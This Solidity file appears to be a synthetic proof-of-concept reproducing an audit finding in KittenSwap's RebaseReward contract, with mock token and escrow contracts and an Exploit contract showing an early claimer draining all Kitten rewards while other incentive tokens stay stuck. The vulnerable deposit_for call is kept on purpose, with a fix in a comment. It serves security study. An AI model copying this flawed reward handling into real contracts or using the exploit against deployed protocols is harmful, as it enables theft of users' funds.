// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  KittenSwap — [C-01] RebaseReward fails because of incorrect token handling
    (Pashov Audit Group, KittenSwap-security-review 2025-06-12; #58065)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: RebaseReward._getReward always does
    `veKitten.deposit_for(_tokenId, reward)` — which locks KITTEN into the
    VotingEscrow — regardless of which reward token the accounting entry was
    for. `notifyRewardAmount` is restricted to Kitten, but inherited
    `incentivize()` still accepts any whitelisted token. Non-Kitten incentives
    therefore cause Kitten to be deposited into veNFT positions, so early
    claimers drain the Kitten balance that belonged to later claimers, while
    the non-Kitten tokens sit locked in RebaseReward forever.

    Vulnerable deposit_for call site preserved @>. */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Minimal VotingEscrow: deposit_for pulls Kitten from caller and adds to locked[tokenId].
contract VotingEscrow {
    MockERC20 public immutable kitten;
    mapping(uint256 => uint256) public locked; // tokenId => Kitten amount locked

    constructor(MockERC20 _kitten) {
        kitten = _kitten;
    }

    function deposit_for(uint256 tokenId, uint256 value) external {
        require(value > 0, "zero");
        // Pulls Kitten from msg.sender (RebaseReward). Reverts if RR is empty.
        kitten.transferFrom(msg.sender, address(this), value);
        locked[tokenId] += value;
    }
}

/// @dev Reduced RebaseReward. incentivize accepts any token; notifyRewardAmount is
///      Kitten-only; _getReward always deposit_for's Kitten.
contract RebaseReward {
    MockERC20 public immutable kitten;
    VotingEscrow public immutable veKitten;

    address[] public rewardTokens;
    mapping(address => bool) public isReward;
    // period => token => reward amount available for that period
    mapping(uint256 => mapping(address => uint256)) public tokenRewards;
    // period => total voting weight
    mapping(uint256 => uint256) public totalSupplyAt;
    // period => tokenId => weight
    mapping(uint256 => mapping(uint256 => uint256)) public balanceOfAt;
    // period => tokenId => token => claimed
    mapping(uint256 => mapping(uint256 => mapping(address => bool))) public claimed;

    uint256 public constant PERIOD = 1; // single simplified period

    event ClaimReward(uint256 period, uint256 tokenId, address token, address owner);
    event Incentivized(address token, uint256 amount);
    event Notified(address token, uint256 amount);

    constructor(MockERC20 _kitten, VotingEscrow _ve) {
        kitten = _kitten;
        veKitten = _ve;
        // Kitten is always a reward token
        _addReward(address(_kitten));
    }

    function _addReward(address token) internal {
        if (!isReward[token]) {
            isReward[token] = true;
            rewardTokens.push(token);
        }
    }

    /// @dev Voter deposits voting weight for a tokenId (called as voter in real system).
    function deposit(uint256 amount, uint256 tokenId) external {
        totalSupplyAt[PERIOD] += amount;
        balanceOfAt[PERIOD][tokenId] += amount;
    }

    /// @dev Anyone can incentivize with ANY token — not overridden in RebaseReward.
    ///      Real code also checks a whitelist; for the bug any non-Kitten token suffices.
    function incentivize(address token, uint256 amount) external {
        require(amount > 0, "zero");
        _addReward(token);
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
        tokenRewards[PERIOD][token] += amount;
        emit Incentivized(token, amount);
    }

    /// @dev Overridden path: only Kitten may be notified as the official reward.
    function notifyRewardAmount(address token, uint256 amount) external {
        require(token == address(kitten), "only kitten");
        require(amount > 0, "zero");
        kitten.transferFrom(msg.sender, address(this), amount);
        tokenRewards[PERIOD][token] += amount;
        // Approve ve so deposit_for can pull Kitten later
        kitten.approve(address(veKitten), type(uint256).max);
        emit Notified(token, amount);
    }

    /// @dev Claim all reward tokens for a veNFT tokenId. For EVERY reward token
    ///      (including non-Kitten), the computed share is deposited as Kitten.
    function getRewardForTokenId(uint256 tokenId) external {
        uint256 supply = totalSupplyAt[PERIOD];
        require(supply > 0, "no supply");
        uint256 bal = balanceOfAt[PERIOD][tokenId];
        require(bal > 0, "no bal");

        uint256 len = rewardTokens.length;
        for (uint256 i; i < len; i++) {
            address _token = rewardTokens[i];
            if (claimed[PERIOD][tokenId][_token]) continue;
            claimed[PERIOD][tokenId][_token] = true;

            uint256 totalR = tokenRewards[PERIOD][_token];
            if (totalR == 0) continue;
            uint256 reward = (bal * totalR) / supply;
            if (reward > 0) {
                veKitten.deposit_for(tokenId, reward); // @> VULN: always deposits Kitten, ignoring which _token the reward was for
                // FIX: if (_token == address(kitten)) veKitten.deposit_for(...);
                //      else MockERC20(_token).transfer(owner, reward);
                emit ClaimReward(PERIOD, tokenId, _token, msg.sender);
            }
        }
    }
}

contract Exploit {
    MockERC20 public kitten; // CREATE nonce 1
    MockERC20 public otherToken; // CREATE nonce 2 — non-Kitten incentive
    VotingEscrow public ve; // CREATE nonce 3
    RebaseReward public rebase; // CREATE nonce 4 — vulnerable

    uint256 public constant TOKEN_ID_1 = 1; // user1 veNFT
    uint256 public constant TOKEN_ID_2 = 2; // user2 veNFT
    uint256 public constant KITTEN_REWARD = 1 ether;
    uint256 public constant OTHER_REWARD = 1 ether;

    uint256 public user1Claimed;

    constructor() {
        kitten = new MockERC20("Kitten", "KITTEN");
        otherToken = new MockERC20("Other", "OTHER");
        ve = new VotingEscrow(kitten);
        rebase = new RebaseReward(kitten, ve);
    }

    function run() external {
        // Equal voting weight for two token IDs (as if voter deposited for both).
        rebase.deposit(1 ether, TOKEN_ID_1);
        rebase.deposit(1 ether, TOKEN_ID_2);

        // Anyone incentivizes 1e18 OTHER (non-Kitten) into RebaseReward.
        otherToken.mint(address(this), OTHER_REWARD);
        otherToken.approve(address(rebase), OTHER_REWARD);
        rebase.incentivize(address(otherToken), OTHER_REWARD);

        // Minter notifies 1e18 Kitten as the official reward.
        kitten.mint(address(this), KITTEN_REWARD);
        kitten.approve(address(rebase), KITTEN_REWARD);
        rebase.notifyRewardAmount(address(kitten), KITTEN_REWARD);

        require(kitten.balanceOf(address(rebase)) == KITTEN_REWARD, "pre: RR holds kitten");
        require(otherToken.balanceOf(address(rebase)) == OTHER_REWARD, "pre: RR holds other");

        // User1 claims. With 50% weight:
        //   Kitten share = 0.5e18  → deposit_for Kitten
        //   Other share  = 0.5e18  → deposit_for Kitten AGAIN (bug)
        // Total Kitten locked for tokenId1 = 1e18 = ALL of the Kitten reward.
        rebase.getRewardForTokenId(TOKEN_ID_1);
        user1Claimed = ve.locked(TOKEN_ID_1);
        require(user1Claimed == KITTEN_REWARD, "user1 drained all kitten");
        require(kitten.balanceOf(address(rebase)) == 0, "RR kitten empty");

        // OTHER tokens remain locked forever in RebaseReward (never transferred out).
        require(otherToken.balanceOf(address(rebase)) == OTHER_REWARD, "other stuck");

        // User2 tries to claim their fair share — deposit_for reverts: no Kitten left.
        // (50% Kitten + 50% Other-as-Kitten = 1e18 more Kitten needed)
        (bool ok,) = address(rebase).call(abi.encodeWithSelector(RebaseReward.getRewardForTokenId.selector, TOKEN_ID_2));
        require(!ok, "user2 should fail");
        require(ve.locked(TOKEN_ID_2) == 0, "user2 got nothing");
    }
}
